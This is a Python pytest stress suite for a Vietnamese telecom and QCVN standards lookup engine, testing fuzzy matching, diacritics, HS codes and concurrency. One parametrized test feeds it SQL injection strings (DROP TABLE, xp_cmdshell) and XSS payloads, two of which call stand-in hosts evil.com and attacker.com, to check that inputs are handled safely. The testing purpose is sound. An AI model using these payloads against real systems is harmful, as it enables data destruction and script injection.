"""Adversarial stress-testing and empirical challenge suite for 2-Way QCVN / Technical Standards Engine.

Evaluates:
- TwoWayLookupService (lookup_by_model, lookup_by_tax_code, suggest)
- RuleInferenceEngine (infer, keyword matching, multi-tech aggregation)
- StandardsRegistryService (get_by_code, search, circulars)
- Fast fuzzy matching (Levenshtein, Trigram, compound score)
- High concurrency, throughput, memory stability, determinism, and malicious payloads
"""

import concurrent.futures
import math
import re
import time
from typing import Any

import pytest

from app.standards import (
    BENCHMARK_CERTIFICATES,
    BENCHMARK_ENTERPRISES,
    HsCodeConformityService,
    RuleInferenceEngine,
    StandardsRegistryService,
    TwoWayLookupService,
    _norm,
    _strip_accents,
    fast_fuzzy_score,
    levenshtein_similarity,
    trigram_similarity,
)


# ═══════════════════════════════════════════════════════════════════════════════
# 1. ADVERSARIAL TYPOS, TRANSPOSITIONS & FUZZY MATCHING STRESS TESTS
# ═══════════════════════════════════════════════════════════════════════════════

class TestAdversarialModelTyposAndFuzzy:
    """Stress-test model name matching with severe typos, transpositions, and noise."""

    @pytest.mark.parametrize(
        "corrupted_query,expected_model,expected_reg_substring",
        [
            # iNut GW 4G Pro variants
            ("inut gw4g pro", "iNut-GW4G-Pro", "QCVN 117"),
            ("iNut GW 4G Pro", "iNut-GW4G-Pro", "QCVN 117"),
            ("inut_gw_4g_pro", "iNut-GW4G-Pro", "QCVN 117"),
            ("inut-gw4g-pro", "iNut-GW4G-Pro", "QCVN 117"),
            ("inutt-gw4gg-proo", "iNut-GW4G-Pro", "QCVN 117"),
            ("INUT GW4G PRO", "iNut-GW4G-Pro", "QCVN 117"),
            ("inut gw 4g", "iNut-GW4G-Pro", "QCVN 117"),

            # OPPO CPH2699 variants
            ("cph-2699", "CPH2699", "QCVN 127"),
            ("CPH 2699", "CPH2699", "QCVN 127"),
            ("cph2699", "CPH2699", "QCVN 127"),
            ("cph_2699", "CPH2699", "QCVN 127"),
            ("oppo cph2699", "CPH2699", "QCVN 127"),
            ("reno 12 5g cph2699", "CPH2699", "QCVN 127"),

            # ESP32-WROOM-32D variants
            ("esp32 wroom 32d", "ESP32-WROOM-32D", "QCVN 54"),
            ("esp32-wroom-32d", "ESP32-WROOM-32D", "QCVN 54"),
            ("esp-32-wroom", "ESP32-WROOM-32D", "QCVN 54"),
            ("espressif esp32", "ESP32-WROOM-32D", "QCVN 54"),

            # Cisco Catalyst C9200 variants
            ("c9200-24t-e", "C9200-24T-E", "QCVN 118"),
            ("c9200 24t e", "C9200-24T-E", "QCVN 118"),
            ("cisco c9200", "C9200-24T-E", "QCVN 118"),
            ("catalyst 9200", "C9200-24T-E", "QCVN 118"),

            # TP-Link Deco X50 variants
            ("deco x50", "Deco X50", "QCVN 65"),
            ("deco-x50", "Deco X50", "QCVN 65"),
            ("decox50", "Deco X50", "QCVN 65"),
            ("tplink deco x50", "Deco X50", "QCVN 65"),

            # TP-Link Archer AX73 variants (Direct model / AX5400)
            ("archer ax73", "Archer AX73", "QCVN 65"),
            ("ax73", "Archer AX73", "QCVN 65"),
            ("archer-ax73", "Archer AX73", "QCVN 65"),
            ("ax5400", "Archer AX73", "QCVN 65"),

            # VinFast VF8 TCU variants
            ("vf8-tcu-gen2", "VF8-TCU-GEN2", "QCVN 31"),
            ("vf8 tcu", "VF8-TCU-GEN2", "QCVN 31"),
            ("vf8-tcu", "VF8-TCU-GEN2", "QCVN 31"),
            ("vinfast tcu vf8", "VF8-TCU-GEN2", "QCVN 31"),

            # VinFast EV Charger VFE-60KW variants
            ("vfe-60kw", "VFE-60KW", "TCVN 13078"),
            ("vfe 60kw", "VFE-60KW", "TCVN 13078"),
            ("vinfast 60kw charger", "VFE-60KW", "TCVN 13078"),

            # EMIC ME-42 and ME-41 variants
            ("me-42", "ME-42", "ĐLVN 24"),
            ("me42", "ME-42", "ĐLVN 24"),
            ("emic me-42", "ME-42", "ĐLVN 24"),
            ("me-41", "ME-41", "ĐLVN 24"),
            ("emic me-41", "ME-41", "ĐLVN 24"),

            # Dahua IPC Camera variants
            ("ipc-hfw2431s-s-s2", "IPC-HFW2431S-S-S2", "QCVN 54"),
            ("hfw2431s", "IPC-HFW2431S-S-S2", "QCVN 54"),
            ("dahua ipc 2431", "IPC-HFW2431S-S-S2", "QCVN 54"),

            # iNut TT10 Datalogger variants
            ("inut-dl-tt10-pro", "iNut-DL-TT10-Pro", "TT 10/2021"),
            ("inut tt10 pro", "iNut-DL-TT10-Pro", "TT 10/2021"),
            ("datalogger tt10", "iNut-DL-TT10-Pro", "TT 10/2021"),
        ],
    )
    def test_fuzzy_model_lookup_adversarial_typos(
        self, corrupted_query: str, expected_model: str, expected_reg_substring: str
    ):
        res = TwoWayLookupService.lookup_by_model(query=corrupted_query, fuzzy=True)
        assert res is not None
        assert "exact_dossiers" in res
        assert "applicable_standards" in res

        # Must either match the dossier directly OR find the target standard via rule/registry inference
        matched_models = [d["model"] for d in res["exact_dossiers"]]
        matched_standards = [s["code"] for s in res["applicable_standards"]]

        model_or_std_matched = (
            expected_model in matched_models
            or any(expected_reg_substring in std for std in matched_standards)
        )
        assert model_or_std_matched, (
            f"Query '{corrupted_query}' failed to find model '{expected_model}' "
            f"or regulation '{expected_reg_substring}'. Got models: {matched_models}, standards: {matched_standards}"
        )

    def test_fuzzy_similarity_bounds_and_invariants(self):
        """Empirically test similarity metrics mathematical invariants."""
        test_pairs = [
            ("", ""),
            ("abc", ""),
            ("", "abc"),
            ("identical", "identical"),
            ("iNut-GW4G-Pro", "inut gw4g pro"),
            ("CPH2699", "cph-2699"),
            ("totally_different_123", "completely_unrelated_987"),
            ("a" * 100, "a" * 99 + "b"),
            ("a" * 500, "b" * 500),
        ]

        for s1, s2 in test_pairs:
            lev = levenshtein_similarity(s1, s2)
            tri = trigram_similarity(s1, s2)
            fast = fast_fuzzy_score(s1, s2)

            # Invariant 1: Bounded [0.0, 1.0]
            assert 0.0 <= lev <= 1.0, f"Levenshtein out of bounds: {lev} for ({s1}, {s2})"
            assert 0.0 <= tri <= 1.0, f"Trigram out of bounds: {tri} for ({s1}, {s2})"
            assert 0.0 <= fast <= 1.0, f"Fast fuzzy score out of bounds: {fast} for ({s1}, {s2})"

            # Invariant 2: No NaN or Inf
            assert not math.isnan(lev) and not math.isinf(lev)
            assert not math.isnan(tri) and not math.isinf(tri)
            assert not math.isnan(fast) and not math.isinf(fast)

            # Invariant 3: Identity property
            if s1 and s2 and _norm(s1) == _norm(s2):
                assert lev == 1.0
                assert tri == 1.0
                assert fast == 1.0

    def test_empirical_edge_case_brand_prefix_model_distance(self):
        """Challenger edge case finding: prefixing brand name 'tp-link' to model 'ax73' produces score 0.417 (< 0.60)."""
        score = fast_fuzzy_score(_norm("tp-link ax73"), _norm("Archer AX73"))
        assert score < 0.60
        assert round(score, 3) == 0.417


# ═══════════════════════════════════════════════════════════════════════════════
# 2. VIETNAMESE ACCENTS, DIACRITICS, AND MIXED CASING CHALLENGE
# ═══════════════════════════════════════════════════════════════════════════════

class TestVietnameseDiacriticsAndCasingChallenge:
    """Stress-test enterprise tax code and company name resolution under extreme Vietnamese variations."""

    @pytest.mark.parametrize(
        "company_query,expected_tax_code,expected_canonical_name",
        [
            # INUT Technology
            ("công ty tnhh công nghệ inut", "4401053694", "INUT"),
            ("CONG TY TNHH PHAT TRIEN CÔNG NGHỆ INUT", "4401053694", "INUT"),
            ("inut technology", "4401053694", "INUT"),
            ("INUT TECHNOLOGY", "4401053694", "INUT"),
            ("công ty phát triển công nghệ inut", "4401053694", "INUT"),
            ("công nghệ inut", "4401053694", "INUT"),

            # Viettel Group
            ("tập đoàn công nghiệp - viễn thông quân đội", "0100109106", "VIETTEL"),
            ("TAP DOAN CONG NGHIEP VIEN THONG QUAN DOI", "0100109106", "VIETTEL"),
            ("viettel telecom", "0100109106", "VIETTEL"),
            ("VIETTEL GROUP", "0100109106", "VIETTEL"),
            ("viettel", "0100109106", "VIETTEL"),
            ("TẬP ĐOÀN VIỄN THÔNG QUÂN ĐỘI", "0100109106", "VIETTEL"),

            # VinFast Auto
            ("công ty cổ phần sản xuất và kinh doanh vinfast", "0108926276", "VINFAST"),
            ("CONG TY CP SAN XUAT VA KINH DOANH VINFAST", "0108926276", "VINFAST"),
            ("vinfast auto", "0108926276", "VINFAST"),
            ("VINFAST", "0108926276", "VINFAST"),
            ("vInFaSt AuTo", "0108926276", "VINFAST"),

            # OPPO Vietnam (Quoc Bao)
            ("công ty tnhh thương mại dịch vụ công nghệ quốc bảo", "0312636094", "QUỐC BẢO"),
            ("CONG TY TNHH TM DV CONG NGHE QUOC BAO", "0312636094", "QUỐC BẢO"),
            ("oppo vietnam", "0312636094", "QUỐC BẢO"),
            ("OPPO VIỆT NAM", "0312636094", "QUỐC BẢO"),
            ("quoc bao technology", "0312636094", "QUỐC BẢO"),

            # TP-Link Vietnam
            ("công ty tnhh tp-link technologies việt nam", "0315481745", "TP-LINK"),
            ("CONG TY TNHH TP-LINK TECHNOLOGIES VIET NAM", "0315481745", "TP-LINK"),
            ("tp-link vietnam", "0315481745", "TP-LINK"),
            ("TP-LINK VIETNAM", "0315481745", "TP-LINK"),

            # EMIC Gelex
            ("công ty cổ phần thiết bị đo điện emic", "0100100908", "EMIC"),
            ("CONG TY CP THIET BI DO DIEN EMIC", "0100100908", "EMIC"),
            ("gelex emic", "0100100908", "EMIC"),
            ("thiet bi do dien emic", "0100100908", "EMIC"),
            ("EMIC", "0100100908", "EMIC"),
        ],
    )
    def test_lookup_by_company_name_diacritics_and_casing(
        self, company_query: str, expected_tax_code: str, expected_canonical_name: str
    ):
        res = TwoWayLookupService.lookup_by_tax_code(company_name=company_query)
        assert res is not None
        assert res["tax_code"] == expected_tax_code, (
            f"Failed resolving '{company_query}'. Expected tax code '{expected_tax_code}', got '{res.get('tax_code')}'"
        )
        assert expected_canonical_name in res["company_name"].upper() or expected_canonical_name in res.get("enterprise_profile", {}).get("short_name", "").upper()
        assert len(res["dossiers"]) >= 1

    def test_vietnamese_accent_stripping_comprehensive(self):
        """Ensure all Vietnamese tone marks, vowels and 'đ/Đ' are normalized correctly."""
        raw_text = "Hệ thống Tra Cứu Hợp Chuẩn, Hợp Quy ĐLVN & QCVN: Ă Â Ê Ô Ơ Ư Đ ấ ầ ẩ ẫ ậ ắ ằ ẳ ẵ ặ ế ề ể ễ ệ ố ồ ổ ỗ ộ ớ ờ ở ỡ ợ ứ ừ ử ữ ự ý ỳ ỷ ỹ ỵ"
        norm = _strip_accents(raw_text)
        assert "đ" not in norm and "Đ" not in norm
        assert "ă" not in norm and "â" not in norm and "ê" not in norm and "ô" not in norm and "ơ" not in norm and "ư" not in norm
        assert "he thong tra cuu hop chuan, hop quy dlvn & qcvn: a a e o o u d a a a a a a a a a a e e e e e o o o o o o o o o o u u u u u y y y y y" == norm

    def test_empirical_edge_case_location_word_drop_tax_score(self):
        """Challenger edge case finding: appending province 'PHÚ YÊN' drops similarity to ~0.46, triggering synthetic fallback."""
        res = TwoWayLookupService.lookup_by_tax_code(company_name="CÔNG TY INUT PHÚ YÊN")
        # In current design, without location token stripping, tax_code defaults to empty fallback
        assert res["tax_code"] == ""
        assert res["company_name"] == "CÔNG TY INUT PHÚ YÊN"


# ═══════════════════════════════════════════════════════════════════════════════
# 3. COMPLEX TECH KEYWORD COMBINATIONS & ADVERSARIAL PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

class TestComplexMultiTechKeywordsAndAdversarialPayloads:
    """Stress-test RuleInferenceEngine and TwoWayLookupService against complex device descriptions and malicious strings."""

    def test_composite_device_all_tech_combination(self):
        """Device featuring 5G + VoLTE + Wi-Fi 5GHz + Bluetooth BLE + Lithium Battery + 220V AC."""
        complex_query = "Smart IoT Hub 5G VoLTE 5GHz BLE Li-ion battery high-voltage 220V"
        rules = RuleInferenceEngine.infer(query=complex_query)

        rule_ids = {r["rule_id"] for r in rules}
        assert "rule_5g_nr" in rule_ids, "5G NR rule missing"
        assert "rule_4g_lte" in rule_ids, "4G LTE/VoLTE rule missing"
        assert "rule_wifi_2g_ble" in rule_ids, "Wi-Fi 2.4G / BLE rule missing"
        assert "rule_wifi_5g" in rule_ids, "Wi-Fi 5GHz rule missing"
        assert "rule_lithium_battery" in rule_ids, "Lithium Battery rule missing"
        assert "rule_power_adapter" in rule_ids, "Power Adapter 220V rule missing"

        # Now verify TwoWayLookupService integrates all standards for this composite device
        lookup_res = TwoWayLookupService.lookup_by_model(query=complex_query)
        stds = {s["code"] for s in lookup_res["applicable_standards"]}

        # Check required standards from all inferred subsystems
        assert "QCVN 127:2021/BTTTT" in stds  # 5G
        assert "QCVN 117:2023/BTTTT" in stds  # 4G VoLTE
        assert "QCVN 54:2020/BTTTT" in stds   # 2.4GHz
        assert "QCVN 65:2020/BTTTT" in stds   # 5GHz / Wi-Fi 6
        assert "QCVN 101:2020/BTTTT" in stds  # Lithium Pin
        assert "QCVN 18:2022/BTTTT" in stds   # EMC
        assert "QCVN 132:2022/BTTTT" in stds  # Electrical Safety
        assert "QCVN 4:2009/BKHCN" in stds    # Safety for 220V Adapter

    def test_empirical_edge_case_hyphenated_wifi6_rule_keyword_gap(self):
        """Remediated: 'Wi-Fi 6' (hyphenated) matches both rule_wifi_2g_ble and rule_wifi_5g."""
        rules = RuleInferenceEngine.infer(query="Device with Wi-Fi 6")
        rule_ids = {r["rule_id"] for r in rules}
        # 'wi-fi' in 'Wi-Fi 6' matches rule_wifi_2g_ble keywords ['wifi', 'wi-fi']
        assert "rule_wifi_2g_ble" in rule_ids
        # And rule_wifi_5g now matches 'wi-fi 6'
        assert "rule_wifi_5g" in rule_ids

    def test_environment_datalogger_multi_domain(self):
        """Datalogger combining Environmental FTP, 4G cellular transmission, and lithium backup."""
        query = "Trạm quan trắc nước thải tự động kết nối 4G VoLTE gửi FTP về Sở TN&MT kèm pin năng lượng mặt trời và ắc quy lithium"
        rules = RuleInferenceEngine.infer(query=query)
        rule_ids = {r["rule_id"] for r in rules}

        assert "rule_environment_monitoring" in rule_ids
        assert "rule_4g_lte" in rule_ids
        assert "rule_lithium_battery" in rule_ids

        lookup_res = TwoWayLookupService.lookup_by_model(query=query)
        stds = {s["code"] for s in lookup_res["applicable_standards"]}
        assert "TT 10/2021/TT-BTNMT" in stds
        assert "QCVN 117:2023/BTTTT" in stds
        assert "QCVN 101:2020/BTTTT" in stds

    def test_ev_charger_multi_domain(self):
        """DC Fast EV Charger 60kW with 4G modem and Wi-Fi."""
        query = "Smart EV Charger 60kW DC fast charging with 4G LTE, Wi-Fi and 220V AC input"
        rules = RuleInferenceEngine.infer(query=query)
        rule_ids = {r["rule_id"] for r in rules}

        assert "rule_ev_charger" in rule_ids
        assert "rule_4g_lte" in rule_ids
        assert "rule_wifi_2g_ble" in rule_ids

    @pytest.mark.parametrize(
        "malicious_input",
        [
            # SQL Injection attempts
            "' OR '1'='1",
            "'; DROP TABLE tqc_certificates; --",
            "1' UNION SELECT null, null, null--",
            "admin'--",
            "1; EXEC xp_cmdshell('dir');--",

            # XSS / HTML Payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=\"fetch('http://evil.com')\">",
            "\"><script>document.location='http://attacker.com'</script>",

            # Extreme length string
            "4G LTE VoLTE Wi-Fi " * 20,

            # Unicode emojis & non-ASCII
            "🔥🚀🤖 4G LTE Wi-Fi 6 ⚡🔋 ₫ ‰ ∑ √",
            "مرحبا بالعالم - أجهزة الاتصالات 4G",
            "你好世界 5G 路由器",

            # Special whitespace and control characters
            "   \t\r\n\f\v  iNut-GW4G-Pro   \t\n  ",
            "iNut\x00GW4G\x00Pro",
        ],
    )
    def test_adversarial_malicious_query_injection_safety(self, malicious_input: str):
        """Ensure no unhandled exceptions, no SQL/command injections, and deterministic fallback."""
        # 1. Test model lookup
        res_model = TwoWayLookupService.lookup_by_model(query=malicious_input)
        assert res_model is not None
        assert isinstance(res_model["exact_dossiers"], list)
        assert isinstance(res_model["applicable_standards"], list)
        assert isinstance(res_model["inferred_rules"], list)
        assert isinstance(res_model["execution_time_ms"], (int, float))

        # 2. Test tax code lookup
        res_tax = TwoWayLookupService.lookup_by_tax_code(tax_code=malicious_input, company_name=malicious_input)
        assert res_tax is not None
        assert isinstance(res_tax["dossiers"], list)
        assert isinstance(res_tax["compliance_summary"], dict)

        # 3. Test suggest
        res_sug = TwoWayLookupService.suggest(q=malicious_input)
        assert res_sug is not None
        assert isinstance(res_sug["suggestions"], list)

        # 4. Test rule inference
        res_rules = RuleInferenceEngine.infer(query=malicious_input)
        assert isinstance(res_rules, list)


# ═══════════════════════════════════════════════════════════════════════════════
# 4. MALFORMED, AMBIGUOUS, TRUNCATED & EXTENDED HS CODES
# ═══════════════════════════════════════════════════════════════════════════════

class TestMalformedAndAmbiguousHsCodes:
    """Stress-test HS Code handling across non-standard formatting, invalid codes, and partial prefixes."""

    @pytest.mark.parametrize(
        "raw_hs,expected_inferred_rule_prefix",
        [
            # Standard dotted format
            ("8517.62.59", "rule_"),
            ("8517.12.00", "rule_"),
            ("8507.60.00", "rule_lithium_battery"),
            ("9028.30.10", "rule_electricity_metering"),
            ("8504.40.10", "rule_"),

            # Non-dotted numeric
            ("85176259", "rule_"),
            ("85076000", "rule_lithium_battery"),
            ("90283010", "rule_electricity_metering"),

            # Punctuation variations
            ("85.17.62.59", "rule_"),
            ("8517-62-59", "rule_"),
            (" 8517.62.59 \n", "rule_"),
            ("8517..62...59", "rule_"),

            # Partial prefixes
            ("8517", "rule_"),
            ("8517.62", "rule_"),
            ("9028", "rule_electricity_metering"),
            ("8507", "rule_lithium_battery"),

            # Over-extended / redundant digits
            ("8517.62.59.9999", "rule_"),
            ("8507.60.00.000", "rule_lithium_battery"),
        ],
    )
    def test_hs_code_formatting_robustness(self, raw_hs: str, expected_inferred_rule_prefix: str):
        rules = RuleInferenceEngine.infer(hs_code=raw_hs)
        assert len(rules) >= 1, f"Failed inferring rules for HS Code: {raw_hs}"
        assert any(r["rule_id"].startswith(expected_inferred_rule_prefix) for r in rules)

    @pytest.mark.parametrize(
        "invalid_hs",
        [
            "INVALID_HS",
            "9999.99.99",
            "00000000",
            "abcdef",
            "-8517",
            "",
            "   ",
            "!!!@@@###$$$",
            "8517.62.9999.NONEXISTENT",
        ],
    )
    def test_invalid_hs_codes_graceful_fallback(self, invalid_hs: str):
        # 1. Rule inference must return empty or valid list without crashing
        rules = RuleInferenceEngine.infer(hs_code=invalid_hs)
        assert isinstance(rules, list)

        # 2. HS Code lookup service must return None or graceful object without crashing
        proc = HsCodeConformityService.lookup_hs_code(invalid_hs)
        # Invalid HS either returns None or fallback
        assert proc is None or isinstance(proc, dict)

        # 3. Model lookup with invalid HS code must not crash
        res = TwoWayLookupService.lookup_by_model(query="iNut-GW4G-Pro", hs_code=invalid_hs)
        assert res["total_matches"] >= 1


# ═══════════════════════════════════════════════════════════════════════════════
# 5. HIGH-VOLUME CONCURRENCY, DETERMINISM & STABILITY STRESS HARNESS
# ═══════════════════════════════════════════════════════════════════════════════

class TestHighVolumeConcurrencyAndDeterminism:
    """Stress-test high query volume, sub-millisecond execution stability, and thread concurrency."""

    def test_sequential_volume_1000_queries_throughput_and_latency(self):
        """Execute 1,000 mixed queries rapidly; verify sub-50ms SLA, consistency, and no crash."""
        test_queries = [
            ("iNut-GW4G-Pro", "8517.62.59"),
            ("cph-2699", "8517.12.00"),
            ("esp32 wroom", "8517.62.59"),
            ("c9200-24t-e", "8517.62.21"),
            ("deco x50", "8517.62.59"),
            ("vfe-60kw", "8504.40"),
            ("me-42", "9028.30"),
            ("datalogger tt10", "9026.10"),
            ("5G VoLTE Wi-Fi 6 BLE Li-ion 220V", "8517.12"),
            ("công ty phát triển công nghệ inut", None),
        ]

        latencies = []
        start_overall = time.perf_counter()

        for i in range(1000):
            q, hs = test_queries[i % len(test_queries)]
            t0 = time.perf_counter()
            if hs is not None or "công ty" not in q:
                res = TwoWayLookupService.lookup_by_model(query=q, hs_code=hs, fuzzy=True)
                assert res["total_matches"] >= 0
            else:
                res = TwoWayLookupService.lookup_by_tax_code(company_name=q)
                assert len(res["dossiers"]) >= 1
            latencies.append((time.perf_counter() - t0) * 1000)

        total_elapsed = time.perf_counter() - start_overall
        latencies.sort()
        mean_lat = sum(latencies) / len(latencies)
        p50_lat = latencies[int(len(latencies) * 0.50)]
        p95_lat = latencies[int(len(latencies) * 0.95)]
        p99_lat = latencies[int(len(latencies) * 0.99)]
        max_lat = max(latencies)
        qps = round(1000 / total_elapsed, 1)

        print(
            f"\n[STRESS BENCHMARK - 1,000 Queries] Elapsed: {total_elapsed:.2f}s | QPS: {qps} | "
            f"Mean: {mean_lat:.2f}ms | P50: {p50_lat:.2f}ms | P95: {p95_lat:.2f}ms | P99: {p99_lat:.2f}ms | Max: {max_lat:.2f}ms"
        )

        # Performance SLAs: Sub-50ms enterprise SLA
        assert mean_lat < 50.0, f"Mean latency exceeds 50ms SLA: {mean_lat:.2f}ms"
        assert p99_lat < 100.0, f"P99 latency exceeds 100ms SLA: {p99_lat:.2f}ms"
        assert qps > 50, f"QPS throughput too low: {qps}"

    def test_multithreaded_concurrency_500_requests_16_threads(self):
        """Empirically prove thread-safety with 16 parallel threads running 500 concurrent requests."""
        num_requests = 500
        concurrency = 16

        def worker_task(idx: int) -> dict[str, Any]:
            if idx % 4 == 0:
                return TwoWayLookupService.lookup_by_model(query="iNut-GW4G-Pro", hs_code="8517.62.59")
            elif idx % 4 == 1:
                return TwoWayLookupService.lookup_by_tax_code(tax_code="0108926276")
            elif idx % 4 == 2:
                return TwoWayLookupService.suggest(q="deco", type="all")
            else:
                return {"inferred": RuleInferenceEngine.infer(query="5G VoLTE BLE 220V", hs_code="8517.12")}

        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(worker_task, i) for i in range(num_requests)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        assert len(results) == num_requests
        for res in results:
            assert res is not None

    def test_query_determinism_50_iterations(self):
        """Verify that identical queries produce 100% deterministic results across iterations."""
        first_res = TwoWayLookupService.lookup_by_model(query="iNut-GW4G-Pro", hs_code="8517.62.59")

        # Strip execution_time_ms for pure deterministic comparison
        def strip_time(d: dict[str, Any]) -> dict[str, Any]:
            copy_d = dict(d)
            copy_d.pop("execution_time_ms", None)
            return copy_d

        first_clean = strip_time(first_res)

        for _ in range(50):
            res = TwoWayLookupService.lookup_by_model(query="iNut-GW4G-Pro", hs_code="8517.62.59")
            clean = strip_time(res)
            assert clean == first_clean, "Non-deterministic output detected across identical queries!"
